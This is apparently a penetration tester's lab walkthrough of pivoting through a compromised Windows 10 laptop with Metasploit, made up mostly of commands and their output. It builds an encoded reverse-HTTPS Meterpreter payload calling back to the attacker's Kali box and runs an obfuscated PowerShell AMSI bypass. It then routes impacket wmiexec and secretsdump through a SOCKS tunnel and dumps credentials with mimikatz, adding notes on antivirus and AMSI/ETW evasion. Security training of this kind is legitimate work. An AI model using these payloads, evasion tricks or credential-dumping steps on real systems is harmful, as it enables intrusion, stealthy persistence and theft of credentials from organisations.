===========================================================================================================================================
Pivoting with the Metasploit penetration testing and C2 framework
===========================================================================================================================================

Metasploit is one of the most known command and control (C2) frameworks used by penetration testers around the globe.
The Metasploit Community Edition is an open-source framework that can be easily customized and used with most operating systems.

=> https://www.offensive-security.com/metasploit-unleashed/msf-community-edition/
=> https://www.kali.org/tools/metasploit-framework/

Context
=========
During during penetration tests, Command and Control solutions (C2) like the Metasploit framework can be used to create a reverse tunnel between
a target Windows/Linux server or a Windows laptop located inside a company internal network and an Internet-facing remote server belonging to the
pentesters (e.g. a Kali VM running in AWS or Azure).
Creating a reverse tunnel is usefull to pass trhough firewalls and pivot inside a company's internal network after having compromise 
for example a vulnerable internet-facing website (e.g. unpatched RCE flaws) or a laptop via a phishing attack.

Basic test lab
===============
> Kali Linux (192.168.56.104)
> Windows 10 Laptop with Defender AV enabled and up-to-date (192.168.1.113)
> Windows 2016 server with Defender AV enabled and up-to-date (192.168.1.196)
> Windows DC 2016 with Defender AV enabled and up-to-date (192.168.1.30)

The Kali Linux box can't reach the network 192.168.1.0/24. 
To be able to reach the machines located in the network 192.168.1.0/24 we will execute a meterpreter session (reverse HTTPS shell with the autoroute
command and a proxy socks) on the Windows 10 laptop to pivot and then attack the machines located in the network 192.168.1.0/24.

Miscellaneous notes
====================

1. Pivoting with Metasploit
---------------------------
> Meterpreter session + Metasploit socks_proxy + Metasploit autoroute module + Proxychains

2. AV detection of Meterpreter payloads 
----------------------------------------
To avoid AV detection it is recommended to use:
> obfuscation & encrypting methods (e.g. custom msfvenom encrypter module => https://github.com/Sogeti-Pentest/Encrypter-Metasploit)
> AMSI bypass techniques 
> stageless (preferred) Meterpreter payload with HTTPs communication using payloads like "windows/x64/meterpreter_reverse_https"
  or "staged" Meterpreter payloads with HTTPs communication using payloads like "windows/x64/meterpreter/reverse_https"
Please note that these techniques are not sufficient to bypass modern EDR products (e.g. NTDLL hooking, ETW). 

3. Difference "Staged" vs "Stageless" 
--------------------------------------
> Staged Meterpreter payload (e.g. windows/meterpreter/reverse_https) 
  Payload that is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger.
  It uses a (small) stager that connects to metasploit handler to download and execute the stage (the final payload).
> Stageless (a.k.a single) Meterpreter payload (e.g. windows/meterpreter_reverse_https)
  Payloads that are self-contained and completely standalone. 


===========================================================================================================================================
PoC - Step 1 - Set up the Metasploit handler and generate the Meterpreter payload (reverse HTTPS payload) on the Kali Linux box
===========================================================================================================================================

1 - Create a self signed SSL certificate that will be used for our reverse HTTPS payload
-----------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout pentest.
key -out pentest.crt
Generating a RSA private key
.........................................................++++
............++++
writing new private key to 'pentest.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:FR
State or Province Name (full name) [Some-State]:France
Locality Name (eg, city) []:Paris
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Company
Organizational Unit Name (eg, section) []:Company
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ cat pentest.key pentest.crt > pentest.pem


2 - Generate an encrypted meterpreter with the payload 'windows/meterpreter/reverse_https'
-------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.56.104 LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/bf_xor
x86/bf_xor succeeded with size 877 (iteration=0)
x86/bf_xor chosen with final size 877
Payload size: 877 bytes
Final size of exe-only file: 73802 bytes
Saved as: reversehttps.exe

NOTES: 
➤ Custom msfvenom encrypter module => https://github.com/Sogeti-Pentest/Encrypter-Metasploit
➤ Command to generate a meterpreter that is able to go trhough an authenticated ntlm proxy:
  + msfvenom -p windows/meterpreter/reverse_https_proxy EXITFUNC=thread HttpProxyHost=X.X.X.X HttpProxyPort=8080 HttpProxyUser="Domain\account" HttpProxyPass=AccountPassword LHOST=Y.Y.Y.Y LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
➤ Multiple techniques & tools (such as shellcode loaders and packers) exist to evade AV detection. For more details please refer to the 'Defense Evasion' section.


3 - Set up and launch a Meterpreter handler (windows/meterpreter/reverse_https)
-----------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.56.104; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableStageEncoding true; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
[sudo] password for jeff:
[!] The following modules were loaded with warnings:
[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
[!] Please see /root/.msf4/logs/framework.log for details.

                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: After running db_nmap, be sure to
check out the result of hosts and services

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_https
LHOST => 192.168.56.104
LPORT => 443
EXITFUNC => thread
ExitOnSession => false
SessionCommunicationTimeout => 0
EnableStageEncoding => true
EnableUnicodeEncoding => true
HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.56.104:443


===========================================================================================================================================
PoC - Step 2 - Run the Meterpreter payload (reverse HTTPS) on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
===========================================================================================================================================

Microsoft Windows [Version 10.0.19044.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;
PS C:\Users\Administrator> (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
PS C:\Users\Administrator> cd .\Documents\Tools-AD\
PS C:\Users\Administrator\Documents\Tools-AD> .\reversehttps.exe
PS C:\Users\Administrator\Documents\Tools-AD>


===============================================================================================================================================================
PoC - Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network (192.168.1.0/24) using a proxy socks5 and Proxychains
              (+ msf autoroute command)
===============================================================================================================================================================

[*] Started HTTPS reverse handler on https://192.168.56.104:443

msf6 exploit(multi/handler) > 
[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Encoded stage with x86/shikata_ga_nai
[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Staging x86 payload (176249 bytes) ...
[*] Meterpreter session 1 opened (192.168.56.104:443 -> 127.0.0.1 ) at 2022-11-01 18:34:12 +0100

msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                        Connection
  --  ----  ----                     -----------                        ----------
  1         meterpreter x86/windows  Laptop1\Administrator @ Laptop1  192.168.56.104:443 -> 127.0.0.1  (192.168.1.113)
  
  
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > show options

Module options (auxiliary/server/socks_proxy):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   SRVHOST   0.0.0.0          yes       The address to listen on
   SRVPORT   1080             yes       The port to listen on
   USERNAME                   no        Proxy username for SOCKS5 listener
   VERSION   5                yes       The SOCKS version to use (Accepted: 4a, 5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 1.
[*] Starting the SOCKS proxy server


msf6 auxiliary(server/socks_proxy) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > run autoroute -s 192.168.1.0 -n 255.255.255.0

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.1.0/255.255.255.0...
[+] Added route to 192.168.1.0/255.255.255.0 via 192.168.56.1
[*] Use the -p option to list all active routes
meterpreter > background
[*] Backgrounding session 1...

------------------------------------------------------------------
Notes
# apt-get install proxychains
# cp /etc/proxychains.conf /etc/proxychains.conf.backup
# echo "socks5 127.0.0.1 1080" > /etc/proxychains.conf
------------------------------------------------------------------

jeff@kali:~$ tail /etc/proxychains.conf 
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
socks5  127.0.0.1 1080

  
============================================================================================================================================
PoC - Step 4 - Use Proxychains on the Kali Linux server and the meterpreter tunnel to pivot into the network (192.168.1.0/24)
============================================================================================================================================

Without going though the meterpreter session/tunnel, the Windows machines located in the network (192.168.1.0/24) are not reachable from our Kali Linux box.

jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ ping 192.168.1.196
ping: connect: Network is unreachable


Example 1 - wmiexec (impacket) connection to the Windows server '192.168.1.196' over the meterpreter tunnel
-------------------------------------------------------------------------------------------------------------

msf6 auxiliary(server/socks_proxy) > proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
[*] exec:  proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:49666-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
webserver1\administrator

C:\>hostname
Webserver1

C:\>exit


Example 2 - Remote credentials dumping using secretsdump (impacket) on the Windows server '192.168.1.196' over the meterpreter tunnel
------------------------------------------------------------------------------------------------------------------------------------

msf6 auxiliary(server/socks_proxy) > proxychains impacket-secretsdump administrator:Superpass2022@192.168.1.196
[*] exec: proxychains impacket-secretsdump administrator:Superpass2022@192.168.1.196

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:445-<><>-OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x804b281f0eff70cd58d31d71e1fe2989
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:413eb6b2b7676dcf83d35b<SNIP>
<SNIP>


Example 3 - RDP connection to the Windows server '192.168.1.196' over the meterpreter tunnel
----------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ proxychains xfreerdp /f /u:administrator /p:Superpass2022 /v:192.168.1.196
ProxyChains-3.1 (http://proxychains.sf.net)                                                                                                                                                                                                
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:3389-^[[B^[[B^[[B<><>-OK                                                                                                                                                                    
[18:53:21:763] [1711:1712] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0                                                                                                
[18:53:21:763] [1711:1712] [WARN][com.freerdp.crypto] - CN = Webserver1.company.work                                                                                                                                                       
[18:53:21:765] [1711:1712] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                                       
[18:53:21:765] [1711:1712] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @                                                                                                                       
[18:53:21:765] [1711:1712] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                                       
[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - The hostname used for this connection (192.168.1.196:3389) 
[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - Common Name (CN):
[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] -        Webserver1.company.work
[18:53:21:766] [1711:1712] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 192.168.1.196:3389 (RDP-Server):
        Common Name: Webserver1.company.work
        Subject:     CN = Webserver1.company.work
        Issuer:      CN = Webserver1.company.work
        Thumbprint:  6f:89:0e:c3:8e:31:f8:73:f8:20:6f:3c:4e:bd:05:f3:48:f6:4a:ae:b1:32:28:d3:38:a0:42:60:1f:4a:2e:fd
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
<SNIP>
[18:54:16:997] [1711:1712] [INFO][com.freerdp.core] - ERRINFO_LOGOFF_BY_USER (0x0000000C):The disconnection was initiated by the user logging off their session on the server.
[18:54:16:997] [1711:1712] [ERROR][com.freerdp.core] - rdp_set_error_info:freerdp_set_last_error_ex ERRINFO_LOGOFF_BY_USER [0x0001000C]

=> The RDP connection works well.


Example 4 - WGET request to a Web server (192.168.1.254) over the meterpreter tunnel
-----------------------------------------------------------------------------------------

msf6 auxiliary(server/socks_proxy) > proxychains wget http://192.168.1.254
[*] exec: proxychains wget http://192.168.1.254

ProxyChains-3.1 (http://proxychains.sf.net)
--2022-11-01 19:24:03--  http://192.168.1.254/
Connecting to 192.168.1.254:80... |S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.254:80-<><>-OK
connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                                     [ <=>                                                                                     ]   3.28K  --.-KB/s    in 0.04s

2022-11-01 19:24:06 (92.4 KB/s) - ‘index.html’ saved [3357]


============================================================================================================================================
Other - Post-exploitation modules & AV detection  
============================================================================================================================================

There are many post-exploitation modules available with the Metasploit C2 framework. 
However, most of them are nowadays easily detected by Antivirus solutions and should not be used unless you don't care about being detected by 
the SOC / Blue team of the company hiring you (Penetration test assignment Versus Red Team assignement).

For instance, the post-exploitation modules like "hashdump", "getsystem" and "shell" are detected by the Windows Defender AV as:
> 'Behavior:Win32/Meterpreter.gen!D'
> 'Behavior:Win32/Meterpreter.D'
> 'Behavior:Win32/Meterpreter.A!sms'
> 'Behavior:Win32/Meterpreter.C!sms'
> ...


Below are some examples of post-exploitation commands and modules
----------------------------------------------------------------

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel
<SNIP>


meterpreter > getuid
Server username: Laptop1\Administrator


meterpreter > getpid
Current pid: 2564


meterpreter > pwd
C:\Users\Administrator\Documents\Tools-AD            


meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege


meterpreter > ipconfig

Windows IP Configuration
<SNIP>
Wireless LAN adapter WiFi:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.1.113
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.254


meterpreter > ps

Process List
============

 PID   PPID  Name                      Arch  Session  User                                       Path
 ---   ----  ----                      ----  -------  ----                                       ----
 0     0     [System Process]
 4     0     System                    x64   0
 68    2100  cmd.exe                   x64   1        Laptop1\Administrator                      C:\Windows\System32\cmd.exe
 76    540   svchost.exe               x64   1        Laptop1\Administrator                      C:\Windows\System32\svchost.exe
 140   476   dwm.exe                   x64   1        Window Manager\DWM-1                       C:\Windows\System32\dwm.exe
 172   2100  MSASCui.exe               x64   1        Laptop1\Administrator                      C:\Program Files\Windows Defender\MSASCui.exe
 256   4     smss.exe                  x64   0
 304   636   ShellExperienceHost.exe   x64   1        Laptop1\Administrator                      C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2t
 <SNIP>


meterpreter > load powershell
Loading extension powershell...Success.

meterpreter > powershell_execute "hostname"
[+] Command execution completed:
Laptop1


meterpreter > load kiwi

Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > kiwi_cmd "privilege::debug" "sekurlsa::logonpasswords"
Privilege '20' OK

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 168639 (00000000:000292bf)
Session           : Interactive from 1
User Name         : Administrator
Domain            : Laptop1
Logon Server      : Laptop1
Logon Time        : 12/30/2022 8:04:52 PM
SID               : S-1-5-21-1644803877-2661921197-3301414406-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : Laptop1
         * NTLM     : cf3a5525ee9414229e66279<SNIP>
         * SHA1     : 3c7374127c9a60f9e5b28d3<SNIP>
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : Laptop1
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : Laptop1
         * Password : (null)
        ssp :
        credman :
<SNIP>


meterpreter > background


msf6 post(windows/manage/execute_dotnet_assembly) > options

Module options (post/windows/manage/execute_dotnet_assembly):

   Name            Current Setting                              Required  Description
   ----            ---------------                              --------  -----------
   AMSIBYPASS      true                                         yes       Enable Amsi bypass
   ARGUMENTS                                                    no        Command line arguments
   DOTNET_EXE      /home/jeff/Documents/Tools/Windows/SharpDum  yes       Assembly file name
                   p.exe
   ETWBYPASS       true                                         yes       Enable Etw bypass
   PID             0                                            no        Pid  to inject
   PPID            0                                            no        Process Identifier for PPID spoofing when creating a new process. (0 = no PPID
                                                                          spoofing)
   PROCESS         notepad.exe                                  no        Process to spawn
   SESSION         2                                            yes       The session to run this module on
   Signature       Automatic                                    yes       The Main function signature (Accepted: Automatic, Main(), Main(string[]))
   USETHREADTOKEN  true                                         no        Spawn process with thread impersonation
   WAIT            10                                           no        Time in seconds to wait

msf6 post(windows/manage/execute_dotnet_assembly) > run

[!] SESSION may not be compatible with this module:
[!]  * missing Meterpreter features: stdapi_sys_process_set_term_size
[*] Running module against Laptop1
[*] Launching notepad.exe to host CLR...
[+] Process 4296 launched.
[*] Reflectively injecting the Host DLL into 4296..
[*] Injecting Host into 4296...
[*] Host injected. Copy assembly into 4296...
[*] Assembly copied.
[*] Executing...
[*] Start reading output
[*] End output.
[+] Execution finished.
[*] Post module execution completed
